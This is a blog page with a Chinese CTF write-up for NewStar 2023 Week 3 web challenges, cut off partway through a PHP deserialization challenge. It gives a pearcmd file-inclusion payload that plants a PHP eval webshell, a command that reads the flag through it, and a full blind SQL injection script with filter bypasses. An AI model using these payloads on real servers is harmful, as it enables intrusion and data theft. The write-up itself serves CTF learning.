@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="week3webInclude 🍐题目： 12345678910111213141516 &lt;?php    error_reporting(0);    if(isset($_GET[&amp;#x27;file&amp;#x27;])) &amp;#123;        $file &#x3D; $_GET[&amp;#x27;file&amp;#x27;];                if(preg_match(&amp;#x27;&#x2F;f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStar2023 Week3">
+<meta property="og:url" content="https://iahzl.github.io/NewStar2023-WriteUp-Week3/index.html">
+<meta property="og:site_name" content="iah&#39;s blog">
+<meta property="og:description" content="week3webInclude 🍐题目： 12345678910111213141516 &lt;?php    error_reporting(0);    if(isset($_GET[&amp;#x27;file&amp;#x27;])) &amp;#123;        $file &#x3D; $_GET[&amp;#x27;file&amp;#x27;];                if(preg_match(&amp;#x27;&#x2F;f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100040895.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100618137.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102307424.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102854987.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027122055140.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025201417567.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144154458.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144414800.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145206974.png">
+<meta property="og:image" content="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145301252.png">
+<meta property="article:published_time" content="2023-10-27T09:13:23.000Z">
+<meta property="article:modified_time" content="2023-10-27T09:25:20.620Z">
+<meta property="article:author" content="iahzl">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="crypto">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100040895.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NewStar2023 Week3</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iah's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/xray-webscan%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/NewStar2023-WriteUp-Week3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&text=NewStar2023 Week3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&is_video=false&description=NewStar2023 Week3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStar2023 Week3&body=Check out this article: https://iahzl.github.io/NewStar2023-WriteUp-Week3/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&title=NewStar2023 Week3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&name=NewStar2023 Week3&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/NewStar2023-WriteUp-Week3/&t=NewStar2023 Week3"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">1.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Include-%F0%9F%8D%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">Include 🍐</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium-sql"><span class="toc-number">1.1.2.</span> <span class="toc-text">medium_sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POP-Gadget"><span class="toc-number">1.1.3.</span> <span class="toc-text">POP Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.4.</span> <span class="toc-text">R!!!C!!!E!!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GenShin"><span class="toc-number">1.1.5.</span> <span class="toc-text">GenShin</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NewStar2023 Week3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">iahzl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-27T09:13:23.000Z" class="dt-published" itemprop="datePublished">2023-10-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/NewStar-2023/">NewStar 2023</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/crypto/" rel="tag">crypto</a>, <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h4><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>根据提示打开<code>phpinfo.php</code> &#x3D;&gt; <code>?file=phpinfo</code>, 搜索flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100040895.png" alt="image-20231024100040895"></p>
+<p>根据提示搜索<code>register_argc_argv</code>, 发现为On</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100618137.png" alt="image-20231024100618137"></p>
+<p>结合题目提示🍐，应该是利用pearcmd文件包含</p>
+<p>构造<strong>payload</strong></p>
+<p><code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102307424.png" alt="image-20231024102307424"></p>
+<p>进行<code>POST</code>查看flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/cmd</span><br><span class="line"><span class="comment">#POST</span></span><br><span class="line"><span class="number">0</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102854987.png" alt="image-20231024102854987"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p>
+<h4 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h4><p>测试判断是否存在布尔盲注 <strong># 要编码为%23</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>TMP0919<span class="string">&#x27;And if(1&gt;0,1,0)%23</span></span><br><span class="line"><span class="string">?id=TMP0919&#x27;</span><span class="keyword">And</span> if(<span class="number">0</span><span class="operator">&gt;</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>前者可以返回正常的信息<code>id: TMP0919</code>，后者会返回<code>id not exists</code>  </p>
+<p>注意用大小写绕过被过滤的字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>(<span class="params"><span class="built_in">str</span>, url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 测试数据库长度.......&quot;</span>)</span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = url + <span class="string">f&quot;&#x27;%20And%20lengTh(daTabase())=<span class="subst">&#123;num&#125;</span>%23&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        r = requests.get(url=payload)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            db_length = num</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库长度：<span class="subst">&#123;db_length&#125;</span>&quot;</span>)</span><br><span class="line">            db_name(db_length)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>(<span class="params">db_length</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 测试数据库名.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;qwertyuioplkjhgfdsazxcvbnm1234567890&quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr(dAtabase(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库名：<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line">    table_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 测试数据库 表名.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):  <span class="comment"># 假定表的长度为25</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(table_name)%20fRom%20infoRmation_schema.tables%20wHere%20tAble_schema=dAtabase()),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="comment"># print(tmp)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库 表名：<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line">    table_columns()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_columns</span>():  <span class="comment"># 此函数是在测试处数据库表名后才写出，因而知道表名“grades,here_is_flag”</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 测试数据库表中列名信息.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 假定列名长度为10</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(column_name)%20fRom%20infoRmation_schema.columns%20wHere%20tAble_name=&#x27;here_is_flag&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库表中列名信息：<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line">    information_flag()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">information_flag</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 测试数据库表中数据.......&quot;</span>)</span><br><span class="line">    strascii = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_, &#123;&#125;&quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strascii:</span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;%20And%20Substr((Select%20flag%20fRom%20here_is_flag),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            r = requests.get(url=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tmp += j</span><br><span class="line">                <span class="comment"># print(tmp)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库表中数据：<span class="subst">&#123;tmp&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://efffc673-9bf2-42fc-ac02-9a443cbe5a85.node4.buuoj.cn:81/?id=TMP0919&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;Physics&#x27;</span></span><br><span class="line">    db_length(<span class="built_in">str</span>, url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意：上述脚本没有使用算法，直接遍历获得相关信息，因而运行时间较长，各位可以根据需求修改代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027122055140.png" alt="image-20231027122055140"></p>
+<h4 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h4><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    